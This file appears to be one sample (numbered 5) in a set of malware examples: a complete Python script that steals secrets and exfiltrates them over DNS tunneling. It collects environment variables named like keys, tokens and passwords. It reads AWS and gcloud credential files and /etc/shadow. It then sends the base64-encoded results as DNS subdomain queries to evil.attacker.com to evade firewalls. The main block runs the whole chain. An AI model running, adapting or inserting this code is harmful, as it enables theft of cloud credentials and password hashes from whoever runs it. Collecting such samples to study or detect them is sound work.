"""
Sample 5: Data Exfiltration via DNS Tunneling
Encodes stolen data into DNS queries to bypass firewall detection.
Uses socket connections and environment variable harvesting.
"""
import os
import socket
import base64

def harvest_environment():
    """Collect all environment variables containing secrets."""
    sensitive_keys = ["AWS_SECRET", "DATABASE_URL", "API_KEY", "TOKEN", "PASSWORD"]
    stolen = {}
    for key, value in os.environ.items():
        for pattern in sensitive_keys:
            if pattern.lower() in key.lower():
                stolen[key] = value
    return stolen

def dns_tunnel_exfil(data: str, attacker_domain: str = "evil.attacker.com"):
    """Exfiltrate data via DNS subdomain encoding to evade firewalls."""
    encoded = base64.b64encode(data.encode()).decode()
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    
    for chunk in chunks:
        query = f"{chunk}.{attacker_domain}"
        try:
            socket.getaddrinfo(query, None)
        except socket.gaierror:
            pass

def read_cloud_credentials():
    """Target AWS and GCloud credential files."""
    targets = [
        os.path.expanduser("~/.aws/credentials"),
        os.path.expanduser("~/.config/gcloud/credentials.db"),
        "/etc/shadow"
    ]
    collected = ""
    for target in targets:
        try:
            with open(target, "r") as f:
                collected += f.read() + "\n"
        except Exception:
            pass
    return collected

if __name__ == "__main__":
    print("[DNSTunnel] Initializing covert channel...")
    try:
        env_data = harvest_environment()
        creds = read_cloud_credentials()
        dns_tunnel_exfil(str(env_data) + creds)
    except Exception as e:
        print(f"[Tunnel Error] {e}")
